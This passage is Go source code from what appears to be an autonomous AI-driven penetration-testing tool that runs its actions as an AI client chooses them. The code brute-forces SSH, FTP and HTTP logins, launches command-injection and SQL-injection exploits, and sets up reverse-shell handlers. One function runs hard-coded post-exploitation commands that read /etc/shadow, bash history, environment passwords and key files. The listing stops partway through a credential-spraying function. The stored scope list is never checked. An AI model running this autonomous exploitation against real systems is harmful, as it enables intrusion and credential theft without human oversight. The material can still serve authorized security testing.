package ai

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"time"

	"pentestai/internal/exploit"
	"pentestai/internal/recon"
	"pentestai/internal/webapp"
)

// AutoRunner executes autonomous penetration tests
type AutoRunner struct {
	ai         *AutoPentester
	scanner    *recon.Scanner
	webScanner *webapp.WebScanner
	framework  *exploit.Framework
	state      *PentestState
	callbacks  RunnerCallbacks
	running    bool
	maxActions int
}

type RunnerCallbacks struct {
	OnActionStart  func(action string, target string)
	OnActionEnd    func(action string, success bool, output string)
	OnFinding      func(finding Finding)
	OnCredential   func(cred CredentialFind)
	OnPhaseChange  func(phase string)
	OnComplete     func(report *PentestReport)
	OnError        func(err error)
	OnAIDecision   func(decision *AIDecision)
}

func NewAutoRunner(client *ClaudeClient) *AutoRunner {
	return &AutoRunner{
		ai:         NewAutoPentester(client),
		scanner:    recon.NewScanner(),
		webScanner: webapp.NewWebScanner(),
		framework:  exploit.NewFramework(),
		state: &PentestState{
			Phase: "initialization",
		},
		maxActions: 25, // Default max actions
	}
}

func (r *AutoRunner) SetMaxActions(max int) {
	r.maxActions = max
}

// getOpt safely extracts string option from interface map
func getOpt(opts map[string]interface{}, key string) string {
	if opts == nil {
		return ""
	}
	if v, ok := opts[key]; ok {
		switch val := v.(type) {
		case string:
			return val
		case float64:
			return strconv.Itoa(int(val))
		case int:
			return strconv.Itoa(val)
		case bool:
			if val {
				return "true"
			}
			return "false"
		default:
			return fmt.Sprintf("%v", v)
		}
	}
	return ""
}

func (r *AutoRunner) SetCallbacks(cb RunnerCallbacks) {
	r.callbacks = cb
}

// Run starts an autonomous pentest against the target
func (r *AutoRunner) Run(ctx context.Context, target string, scope []string) (*PentestReport, error) {
	r.state.Target = target
	r.state.Scope = scope
	r.state.Phase = "reconnaissance"
	r.running = true

	if r.callbacks.OnPhaseChange != nil {
		r.callbacks.OnPhaseChange("reconnaissance")
	}

	actionCount := 0

	for r.running && actionCount < r.maxActions {
		select {
		case <-ctx.Done():
			r.running = false
			break
		default:
		}

		// Get next action from AI
		decision, err := r.ai.GetNextAction(ctx, r.state)
		if err != nil {
			if r.callbacks.OnError != nil {
				r.callbacks.OnError(err)
			}
			continue
		}

		if r.callbacks.OnAIDecision != nil {
			r.callbacks.OnAIDecision(decision)
		}

		// Check for completion
		if decision.Action == "complete" || decision.Action == "report" {
			r.state.Phase = "reporting"
			if r.callbacks.OnPhaseChange != nil {
				r.callbacks.OnPhaseChange("reporting")
			}
			break
		}

		// Execute the action
		if r.callbacks.OnActionStart != nil {
			r.callbacks.OnActionStart(decision.Action, decision.Target)
		}

		action, err := r.executeAction(ctx, decision)
		if err != nil {
			if r.callbacks.OnError != nil {
				r.callbacks.OnError(err)
			}
		}

		if action != nil {
			r.state.ActionHistory = append(r.state.ActionHistory, *action)

			if r.callbacks.OnActionEnd != nil {
				r.callbacks.OnActionEnd(action.Type, action.Success, action.Result)
			}
		}

		actionCount++

		// Update phase based on progress
		r.updatePhase()
	}

	// Generate final report
	report, err := r.ai.GenerateReport(ctx, r.state)
	if err != nil {
		return nil, err
	}

	if r.callbacks.OnComplete != nil {
		r.callbacks.OnComplete(report)
	}

	return report, nil
}

func (r *AutoRunner) Stop() {
	r.running = false
}

func (r *AutoRunner) GetState() *PentestState {
	return r.state
}

func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*Action, error) {
	action := &Action{
		Type:      decision.Action,
		Target:    decision.Target,
		Module:    decision.Module,
		Options:   decision.Options,
		Timestamp: time.Now(),
		Data:      make(map[string]interface{}),
	}

	switch decision.Action {
	case "scan_ports":
		return r.actionScanPorts(ctx, action, decision)
	case "scan_network":
		return r.actionScanNetwork(ctx, action, decision)
	case "service_scan":
		return r.actionServiceScan(ctx, action, decision)
	case "web_scan":
		return r.actionWebScan(ctx, action, decision)
	case "dir_scan":
		return r.actionDirScan(ctx, action, decision)
	case "ssh_login":
		return r.actionSSHLogin(ctx, action, decision)
	case "ssh_exec":
		return r.actionSSHExec(ctx, action, decision)
	case "ftp_login":
		return r.actionFTPLogin(ctx, action, decision)
	case "ftp_anon":
		return r.actionFTPAnon(ctx, action, decision)
	case "http_login":
		return r.actionHTTPLogin(ctx, action, decision)
	case "redis_check":
		return r.actionRedisCheck(ctx, action, decision)
	case "cmd_inject":
		return r.actionCmdInject(ctx, action, decision)
	case "sqli_exploit":
		return r.actionSQLiExploit(ctx, action, decision)
	case "full_scan":
		return r.actionFullScan(ctx, action, decision)
	case "ssh_recon":
		return r.actionSSHRecon(ctx, action, decision)
	case "reverse_shell":
		return r.actionReverseShell(ctx, action, decision)
	case "cred_spray":
		return r.actionCredSpray(ctx, action, decision)
	case "lfi_exploit":
		return r.actionLFI(ctx, action, decision)
	case "ssrf_exploit":
		return r.actionSSRF(ctx, action, decision)
	case "file_upload":
		return r.actionFileUpload(ctx, action, decision)
	case "nuclei_scan":
		return r.actionNucleiScan(ctx, action, decision)
	case "xss_scan":
		return r.actionXSSScan(ctx, action, decision)
	case "nikto_scan":
		return r.actionNiktoScan(ctx, action, decision)
	case "subdomain_enum":
		return r.actionSubdomainEnum(ctx, action, decision)
	case "ssl_scan":
		return r.actionSSLScan(ctx, action, decision)
	default:
		action.Result = fmt.Sprintf("Unknown action: %s", decision.Action)
		action.Success = false
	}

	return action, nil
}

func (r *AutoRunner) actionScanPorts(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	ports := recon.TopPorts(100)
	if p := getOpt(decision.Options, "ports"); p != "" {
		ports = parsePorts(p)
	}

	opts := recon.ScanOptions{
		Ports:       ports,
		BannerGrab:  true,
		ServiceScan: true,
	}

	host, err := r.scanner.ScanHost(ctx, target, opts)
	if err != nil {
		action.Result = fmt.Sprintf("Scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Update state with discovered ports
	for _, port := range host.Ports {
		if port.State == "open" {
			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
				Host:     target,
				Port:     port.Number,
				Protocol: port.Protocol,
				State:    port.State,
			})

			r.state.Services = append(r.state.Services, ServiceInfo{
				Host:    target,
				Port:    port.Number,
				Name:    port.Service.Name,
				Product: port.Service.Product,
				Version: port.Service.Version,
				Banner:  port.Banner,
			})
		}
	}

	// Add host to discovered hosts
	r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
		IP:       host.IP,
		Hostname: host.Hostname,
		Status:   host.State,
	})

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Scanned %s - %d open ports found\n", target, len(host.Ports)))
	for _, port := range host.Ports {
		if port.State == "open" {
			sb.WriteString(fmt.Sprintf("  %d/%s - %s", port.Number, port.Protocol, port.Service.Name))
			if port.Service.Product != "" {
				sb.WriteString(fmt.Sprintf(" (%s %s)", port.Service.Product, port.Service.Version))
			}
			sb.WriteString("\n")
		}
	}

	action.Result = sb.String()
	action.Success = len(host.Ports) > 0
	action.Data["host"] = host

	return action, nil
}

func (r *AutoRunner) actionScanNetwork(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	cidr := getOpt(decision.Options, "cidr")
	if cidr == "" {
		cidr = decision.Target
	}

	hosts, err := r.scanner.PingSweep(ctx, cidr)
	if err != nil {
		action.Result = fmt.Sprintf("Network scan failed: %v", err)
		action.Success = false
		return action, err
	}

	for _, ip := range hosts {
		r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
			IP:     ip,
			Status: "up",
		})
	}

	action.Result = fmt.Sprintf("Discovered %d live hosts: %s", len(hosts), strings.Join(hosts, ", "))
	action.Success = len(hosts) > 0
	action.Data["hosts"] = hosts

	return action, nil
}

func (r *AutoRunner) actionServiceScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	// Parse port from target if format is host:port
	port := 0
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port, _ = strconv.Atoi(parts[1])
	}
	if port == 0 {
		port, _ = strconv.Atoi(getOpt(decision.Options, "port"))
	}

	opts := recon.ScanOptions{
		Ports:       []int{port},
		BannerGrab:  true,
		ServiceScan: true,
	}

	host, err := r.scanner.ScanHost(ctx, target, opts)
	if err != nil {
		action.Result = fmt.Sprintf("Service scan failed: %v", err)
		action.Success = false
		return action, err
	}

	if len(host.Ports) > 0 {
		p := host.Ports[0]
		action.Result = fmt.Sprintf("Service on %s:%d - %s %s %s\nBanner: %s",
			target, port, p.Service.Name, p.Service.Product, p.Service.Version, p.Banner)
		action.Success = true

		// Update state
		for i, svc := range r.state.Services {
			if svc.Host == target && svc.Port == port {
				r.state.Services[i].Product = p.Service.Product
				r.state.Services[i].Version = p.Service.Version
				r.state.Services[i].Banner = p.Banner
				break
			}
		}
	} else {
		action.Result = "No service information retrieved"
		action.Success = false
	}

	return action, nil
}

func (r *AutoRunner) actionWebScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	url := decision.Target
	if !strings.HasPrefix(url, "http") {
		url = "http://" + url
	}

	result, err := r.webScanner.Scan(ctx, url)
	if err != nil {
		action.Result = fmt.Sprintf("Web scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Add findings to state
	for _, finding := range result.Findings {
		f := Finding{
			Type:        finding.Type,
			Severity:    finding.Severity,
			Target:      url,
			Description: finding.Description,
			Evidence:    finding.Evidence,
			Remediation: finding.Remediation,
			Timestamp:   time.Now(),
		}
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, f)

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(f)
		}
	}

	action.Result = result.FormatResult()
	action.Success = true
	action.Data["findings"] = result.Findings
	action.Data["technologies"] = result.Technologies

	return action, nil
}

func (r *AutoRunner) actionDirScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/dir_scanner"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse URL to get host and port
	target := decision.Target
	port := "80"
	ssl := "false"

	if strings.HasPrefix(target, "https://") {
		ssl = "true"
		port = "443"
		target = strings.TrimPrefix(target, "https://")
	} else {
		target = strings.TrimPrefix(target, "http://")
	}

	if idx := strings.Index(target, ":"); idx != -1 {
		port = target[idx+1:]
		if slashIdx := strings.Index(port, "/"); slashIdx != -1 {
			port = port[:slashIdx]
		}
		target = target[:idx]
	} else if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	module.SetOption("SSL", ssl)

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Dir scan failed: %v", err)
		action.Success = false
		return action, err
	}

	action.Result = result.Output
	action.Success = result.Success
	action.Data["found_paths"] = result.Data["found_paths"]

	return action, nil
}

func (r *AutoRunner) actionSSHLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ssh/ssh_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target - could be "ip:port" format
	target := decision.Target
	port := "22" // default

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	// Override port if explicitly set in options
	if p := getOpt(decision.Options, "port"); p != "" {
		module.SetOption("RPORT", p)
	}
	if user := getOpt(decision.Options, "username"); user != "" {
		module.SetOption("USERNAME", user)
	}
	if pass := getOpt(decision.Options, "password"); pass != "" {
		module.SetOption("PASSWORD", pass)
	}
	if userFile := getOpt(decision.Options, "user_file"); userFile != "" {
		module.SetOption("USER_FILE", userFile)
	}
	if passFile := getOpt(decision.Options, "pass_file"); passFile != "" {
		module.SetOption("PASS_FILE", passFile)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSH login failed: %v", err)
		action.Success = false
		return action, err
	}

	// Add found credentials to state
	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Password,
			Service:  "ssh",
			Target:   fmt.Sprintf("%s:%s", target, port),
		}
		r.state.Credentials = append(r.state.Credentials, cf)

		if r.callbacks.OnCredential != nil {
			r.callbacks.OnCredential(cf)
		}
	}

	action.Result = result.Output
	if result.Output == "" && result.Success {
		action.Result = fmt.Sprintf("SSH credentials found on %s:%s", target, port)
	} else if result.Output == "" {
		action.Result = fmt.Sprintf("No valid SSH credentials found on %s:%s", target, port)
	}
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionSSHExec(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}
	if user := getOpt(decision.Options, "username"); user != "" {
		module.SetOption("USERNAME", user)
	}
	if pass := getOpt(decision.Options, "password"); pass != "" {
		module.SetOption("PASSWORD", pass)
	}
	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSH exec failed: %v", err)
		action.Success = false
		return action, err
	}

	action.Result = result.Output
	action.Success = result.Success

	// Add session if successful
	if result.Success {
		r.state.Sessions = append(r.state.Sessions, SessionInfo{
			ID:     fmt.Sprintf("ssh-%d", len(r.state.Sessions)+1),
			Type:   "ssh",
			Target: decision.Target,
			User:   getOpt(decision.Options, "username"),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionFTPLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ftp/ftp_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("FTP login failed: %v", err)
		action.Success = false
		return action, err
	}

	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Password,
			Service:  "ftp",
			Target:   decision.Target,
		}
		r.state.Credentials = append(r.state.Credentials, cf)

		if r.callbacks.OnCredential != nil {
			r.callbacks.OnCredential(cf)
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionFTPAnon(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ftp/anonymous"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("FTP anon check failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "anonymous_ftp",
			Severity:    "medium",
			Target:      decision.Target,
			Description: "Anonymous FTP access enabled",
			Remediation: "Disable anonymous FTP access",
			Timestamp:   time.Now(),
		})
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionHTTPLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/http_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse URL
	target := decision.Target
	port := "80"
	if strings.HasPrefix(target, "https://") {
		module.SetOption("SSL", "true")
		port = "443"
		target = strings.TrimPrefix(target, "https://")
	} else {
		target = strings.TrimPrefix(target, "http://")
	}

	if idx := strings.Index(target, ":"); idx != -1 {
		port = target[idx+1:]
		target = target[:idx]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if user := getOpt(decision.Options, "username"); user != "" {
		module.SetOption("USERNAME", user)
	}
	if pass := getOpt(decision.Options, "password"); pass != "" {
		module.SetOption("PASSWORD", pass)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("HTTP login failed: %v", err)
		action.Success = false
		return action, err
	}

	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Password,
			Service:  "http",
			Target:   decision.Target,
		}
		r.state.Credentials = append(r.state.Credentials, cf)
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionRedisCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/redis/redis_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Redis check failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "redis_unauth",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "Redis accessible without authentication",
			Remediation: "Enable Redis authentication with requirepass",
			Timestamp:   time.Now(),
		})
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) updatePhase() {
	// Determine current phase based on progress
	hasHosts := len(r.state.DiscoveredHosts) > 0
	hasPorts := len(r.state.OpenPorts) > 0
	hasServices := len(r.state.Services) > 0
	hasVulns := len(r.state.Vulnerabilities) > 0
	hasCreds := len(r.state.Credentials) > 0
	hasSessions := len(r.state.Sessions) > 0

	newPhase := r.state.Phase

	if !hasHosts && !hasPorts {
		newPhase = "reconnaissance"
	} else if hasHosts && !hasServices {
		newPhase = "enumeration"
	} else if hasServices && !hasVulns && !hasCreds {
		newPhase = "vulnerability_assessment"
	} else if (hasVulns || hasCreds) && !hasSessions {
		newPhase = "exploitation"
	} else if hasSessions {
		newPhase = "post_exploitation"
	}

	if newPhase != r.state.Phase {
		r.state.Phase = newPhase
		if r.callbacks.OnPhaseChange != nil {
			r.callbacks.OnPhaseChange(newPhase)
		}
	}
}

func (r *AutoRunner) actionCmdInject(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/cmd_injection"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}
	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Command injection failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "command_injection",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "OS Command Injection - Remote Code Execution achieved",
			Evidence:    result.Output,
			Remediation: "Sanitize user input, use parameterized commands, implement allowlist validation",
			Timestamp:   time.Now(),
		})

		// Add session if we got RCE
		r.state.Sessions = append(r.state.Sessions, SessionInfo{
			ID:     fmt.Sprintf("rce-%d", len(r.state.Sessions)+1),
			Type:   "web_rce",
			Target: decision.Target,
			User:   "www-data",
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "command_injection",
				Severity:    "critical",
				Target:      decision.Target,
				Description: "Command Injection RCE",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionSQLiExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/dvwa_sqli"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}
	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SQLi exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "sql_injection",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "SQL Injection - Database access achieved",
			Evidence:    result.Output,
			Remediation: "Use parameterized queries/prepared statements, implement input validation",
			Timestamp:   time.Now(),
		})

		// Add any extracted credentials
		for _, cred := range result.Credentials {
			cf := CredentialFind{
				Username: cred.Username,
				Password: cred.Password,
				Service:  "sqli_dump",
				Target:   decision.Target,
			}
			r.state.Credentials = append(r.state.Credentials, cf)

			if r.callbacks.OnCredential != nil {
				r.callbacks.OnCredential(cf)
			}
		}

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "sql_injection",
				Severity:    "critical",
				Target:      decision.Target,
				Description: "SQL Injection vulnerability exploited",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func parsePorts(s string) []int {
	var ports []int
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			bounds := strings.Split(part, "-")
			if len(bounds) == 2 {
				start, _ := strconv.Atoi(bounds[0])
				end, _ := strconv.Atoi(bounds[1])
				for p := start; p <= end; p++ {
					ports = append(ports, p)
				}
			}
		} else {
			p, _ := strconv.Atoi(part)
			if p > 0 {
				ports = append(ports, p)
			}
		}
	}
	return ports
}

// actionFullScan scans all 65535 ports with high concurrency
func (r *AutoRunner) actionFullScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host, err := r.scanner.FastFullScan(ctx, target)
	if err != nil {
		action.Result = fmt.Sprintf("Full scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Update state with discovered ports
	sshPorts := []int{}
	for _, port := range host.Ports {
		if port.State == "open" {
			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
				Host:     target,
				Port:     port.Number,
				Protocol: port.Protocol,
				State:    port.State,
			})

			r.state.Services = append(r.state.Services, ServiceInfo{
				Host:    target,
				Port:    port.Number,
				Name:    port.Service.Name,
				Product: port.Service.Product,
				Version: port.Service.Version,
			})

			// Track SSH ports
			if port.Service.Name == "ssh" {
				sshPorts = append(sshPorts, port.Number)
			}
		}
	}

	// Add host to discovered hosts
	r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
		IP:       host.IP,
		Hostname: host.Hostname,
		Status:   host.State,
	})

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Full scan of %s - %d open ports found\n", target, len(host.Ports)))

	// Highlight SSH services
	if len(sshPorts) > 0 {
		sb.WriteString(fmt.Sprintf("  [!] SSH services found on ports: %v\n", sshPorts))
	}

	for _, port := range host.Ports {
		if port.State == "open" {
			sb.WriteString(fmt.Sprintf("  %d/%s - %s", port.Number, port.Protocol, port.Service.Name))
			if port.Service.Product != "" {
				sb.WriteString(fmt.Sprintf(" (%s)", port.Service.Product))
			}
			sb.WriteString("\n")
		}
	}

	action.Result = sb.String()
	action.Success = len(host.Ports) > 0
	action.Data["host"] = host
	action.Data["ssh_ports"] = sshPorts

	return action, nil
}

// actionSSHRecon performs post-exploitation reconnaissance after SSH access
func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target
	target := decision.Target
	port := "22"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	username := getOpt(decision.Options, "username")
	password := getOpt(decision.Options, "password")

	if username == "" || password == "" {
		action.Result = "SSH recon requires username and password"
		action.Success = false
		return action, nil
	}

	module.SetOption("USERNAME", username)
	module.SetOption("PASSWORD", password)

	// List of recon commands to demonstrate impact
	reconCommands := []struct {
		cmd  string
		desc string
	}{
		{"id && whoami", "Current User Info"},
		{"uname -a", "System Information"},
		{"cat /etc/passwd | head -20", "User Accounts"},
		{"cat /etc/shadow 2>/dev/null | head -10 || echo 'No access to shadow'", "Password Hashes (if root)"},
		{"ls -la /home/", "Home Directories"},
		{"cat /etc/hosts", "Network Hosts"},
		{"netstat -tulpn 2>/dev/null || ss -tulpn", "Listening Services"},
		{"ps aux | head -20", "Running Processes"},
		{"cat /etc/crontab 2>/dev/null", "Scheduled Tasks"},
		{"find /home -name '*.txt' -o -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -20", "Sensitive Files"},
		{"cat ~/.bash_history 2>/dev/null | head -30", "Command History"},
		{"env | grep -i pass || echo 'No password in env'", "Environment Variables"},
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n=== POST-EXPLOITATION RECON ON %s:%s as %s ===\n\n", target, port, username))

	for _, recon := range reconCommands {
		module.SetOption("CMD", recon.cmd)
		result, err := module.Run(ctx)

		sb.WriteString(fmt.Sprintf("--- %s ---\n", recon.desc))
		if err != nil {
			sb.WriteString(fmt.Sprintf("Error: %v\n", err))
		} else if result.Output != "" {
			sb.WriteString(result.Output)
			sb.WriteString("\n")
		} else {
			sb.WriteString("(no output)\n")
		}
		sb.WriteString("\n")
	}

	// Add critical finding
	r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
		Type:        "ssh_compromise",
		Severity:    "critical",
		Target:      fmt.Sprintf("%s:%s", target, port),
		Description: fmt.Sprintf("Full SSH access gained as '%s' - system reconnaissance completed", username),
		Evidence:    sb.String(),
		Remediation: "Change compromised password, review SSH authentication settings, implement key-based auth",
		Timestamp:   time.Now(),
	})

	// Add session
	r.state.Sessions = append(r.state.Sessions, SessionInfo{
		ID:       fmt.Sprintf("ssh-recon-%d", len(r.state.Sessions)+1),
		Type:     "ssh",
		Target:   fmt.Sprintf("%s:%s", target, port),
		User:     username,
		Platform: "linux",
	})

	if r.callbacks.OnFinding != nil {
		r.callbacks.OnFinding(Finding{
			Type:        "ssh_compromise",
			Severity:    "critical",
			Target:      fmt.Sprintf("%s:%s", target, port),
			Description: fmt.Sprintf("SSH shell obtained as %s - recon completed", username),
		})
	}

	action.Result = sb.String()
	action.Success = true
	action.Data["username"] = username
	action.Data["recon_output"] = sb.String()

	return action, nil
}

// actionReverseShell generates reverse shell payloads for all supported shell types
func (r *AutoRunner) actionReverseShell(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/handler"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Get LHOST and LPORT from options
	lhost := getOpt(decision.Options, "lhost")
	lport := getOpt(decision.Options, "lport")

	if lhost == "" {
		lhost = "127.0.0.1" // Default to localhost
	}
	if lport == "" {
		lport = "4444" // Default port
	}

	module.SetOption("LHOST", lhost)
	module.SetOption("LPORT", lport)
	module.SetOption("RHOSTS", decision.Target)

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Reverse shell generation failed: %v", err)
		action.Success = false
		return action, err
	}

	// Add finding about available reverse shell payloads
	r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
		Type:        "reverse_shell_ready",
		Severity:    "info",
		Target:      decision.Target,
		Description: fmt.Sprintf("Reverse shell payloads generated for %s:%s", lhost, lport),
		Evidence:    result.Output,
		Remediation: "These payloads can be used with command injection vulnerabilities",
		Timestamp:   time.Now(),
	})

	action.Result = result.Output
	action.Success = result.Success
	action.Data["lhost"] = lhost
	action.Data["lport"] = lport
	action.Data["payloads"] = result.Data["payloads"]

	return action, nil
}

// actionCredSpray tries credentials on various services (FTP, MySQL, HTTP, Redis)
func (r *AutoRunner) actionCredSpray(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	username := getOpt(decision.Options, "username")
	password := getOpt(decision.Options, "password")
	service := getOpt(decision.Options, "service")

